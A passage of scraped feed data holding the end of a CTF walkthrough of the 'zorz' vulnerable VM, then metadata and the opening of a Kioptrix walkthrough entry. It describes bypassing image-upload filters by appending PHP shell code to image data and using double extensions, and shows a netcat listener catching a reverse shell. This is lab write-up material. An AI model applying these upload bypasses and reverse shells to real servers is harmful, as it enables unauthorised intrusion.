\n<p><img src=\"https://highon.coffee/img/blog/zorz/upload2-fail.png\" alt=\"php shell upload fail\" /></p> \n<p>Several attempts were then made to upload shells with various extensions such as <code>shell.png.php</code> , <code>shell.php.png</code> etc to bypass the web application filtering, all attempts to bypassed the filtering failed.</p> \n<h3 id=\"burp-suite---php-shell-injection-in-an-image-file\">Burp Suite - PHP Shell Injection in an Image file</h3> \n<p>It was apparent the web application had a mechanism for image file validation, several attempts were made to inject the php shell code into the image file. The solution was to inject the code at the end of the image data.</p> \n<p>The file extension also needed modifying to <code>.php.jpg</code>, this appeared to force the web server to process the file, likely due to poorly configured Apache MIME types.</p> \n<p><img src=\"https://highon.coffee/img/blog/zorz/burp-php-shell-injection-in-an-image.png\" alt=\"Burp Suite shell injection in an image\" /></p> \n<p>Image uploaded successfully.</p> \n<p><img src=\"https://highon.coffee/img/blog/zorz/uploaded-shell.png\" alt=\"Shell Upload\" /></p> \n<p>Execution of image from <code>/uploads2</code></p> \n<p><img src=\"https://highon.coffee/img/blog/zorz/dir.png\" alt=\"upload dir\" /></p> \n<h3 id=\"reverse-shell\">Reverse Shell:</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# nc <span class=\"nt\">-n</span> <span class=\"nt\">-v</span> <span class=\"nt\">-l</span> <span class=\"nt\">-p</span> 443\nlistening on <span class=\"o\">[</span>any] 443 ...\nconnect to <span class=\"o\">[</span>10.0.1.110] from <span class=\"o\">(</span>UNKNOWN<span class=\"o\">)</span> <span class=\"o\">[</span>10.0.1.111] 33118\nLinux zorz 3.13.0-45-generic <span class=\"c\">#74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux</span>\n 17:02:32 up 42 min,  0 <span class=\"nb\">users</span>,  load average: 0.00, 0.01, 0.01\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\n<span class=\"nv\">uid</span><span class=\"o\">=</span>33<span class=\"o\">(</span>www-data<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>33<span class=\"o\">(</span>www-data<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>33<span class=\"o\">(</span>www-data<span class=\"o\">)</span>\n/bin/sh: 0: can<span class=\"s1\">'t access tty; job control turned off\n$</span></code></pre> \n</figure> \n<p>Level 2 complete.</p> \n<h2 id=\"level-3\">Level 3</h2> \n<p>Level 3 was beaten simply by renaming the php reverse shell to <code>php-reverse-shell.php.png</code>, this was enough to bypass the filtering.</p> \n<p><img src=\"https://highon.coffee/img/blog/zorz/level3.png\" alt=\"Level 3\" /></p> \n<p>An alternative solution would of been to use burp to upload the file + change the content type.</p> \n<h2 id=\"flag\">Flag</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">$ </span><span class=\"nb\">cd </span>l337saucel337\n<span class=\"nv\">$ </span><span class=\"nb\">ls\n</span>SECRETFILE\n<span class=\"nv\">$ </span><span class=\"nb\">cat </span>SE\n<span class=\"nb\">cat</span>: SE: No such file or directory\n<span class=\"nv\">$ </span><span class=\"nb\">cat </span>SECRETFILE\nGreat job so far. This box has 3 uploaders.\n\nThe first 2 are pure php, the last one is php w/jquery.\n\nTo get credit <span class=\"k\">for </span>this challenge, please submit a write-up or instructions\non how you compromised the uploader or uploaders. If you solve 1, 2, or all\nof the uploader challenges, feel free to shoot me an email and <span class=\"nb\">let </span>me know!\n\nThanks <span class=\"k\">for </span>playing!\nhttp://www.top-hat-sec.com\n<span class=\"err\">$</span></code></pre> \n</figure> \n<p>Level 3 complete.</p> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Wed, 01 Jul 2015 00:00:00 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/zorz/dirbuster.png","linkMd5":"c9f93660e52ba3827a031f59bd2ef091","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn7@2020_3/2020/08/25/01-24-54-298_4fce7263c7e117fe.webp","destWidth":767,"destHeight":543,"sourceBytes":36822,"destBytes":37422,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/zorz/dirbuster.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn7@2020_3/2020/08/25/01-24-54-298_4fce7263c7e117fe.webp","https://highon.coffee/img/blog/zorz/uploader1.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn55@2020_5/2020/08/25/01-25-14-381_223b7f984e0ea8e5.webp","https://highon.coffee/img/blog/zorz/file-upload.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn87@2020_5/2020/08/25/01-25-15-701_0212081c261eca50.webp","https://highon.coffee/img/blog/zorz/uploads1.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn68@2020_3/2020/08/25/01-25-15-737_b54dd68b240e8e77.webp","https://highon.coffee/img/blog/zorz/upload2-fail.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn84@2020_6/2020/08/25/01-25-16-077_be6b0c4603985284.webp","https://highon.coffee/img/blog/zorz/burp-php-shell-injection-in-an-image.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn47@2020_6/2020/08/25/01-25-14-649_bbf4e290f15bcd26.webp","https://highon.coffee/img/blog/zorz/uploaded-shell.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn35@2020_2/2020/08/25/01-25-15-826_9af46bcffc960913.webp","https://highon.coffee/img/blog/zorz/dir.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn43@2020_4/2020/08/25/01-25-15-676_b7d37fa558873d79.webp","https://highon.coffee/img/blog/zorz/level3.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn24@2020_3/2020/08/25/01-25-16-859_d256dc677c33018c.webp"},"publishedOrCreatedDate":1598318675550},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"Kioptrix Level 1.2 Walkthrough","link":"https://highon.coffee/blog/kioptrix-level-1-2-walkthrough/","description":"<div class=\"coffee-rating\"> \n <table> \n  <tbody> \n   <tr> \n    <td> <p><code>Coffee Difficulty Rating:</code></p> </td> \n    <td> <p><i class=\"fa fa-coffee\"></i></p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/kioptrix-level-1-2-walkthrough/#author-description\" id=\"markdown-toc-author-description\">Author Description</a></li> \n <li><a
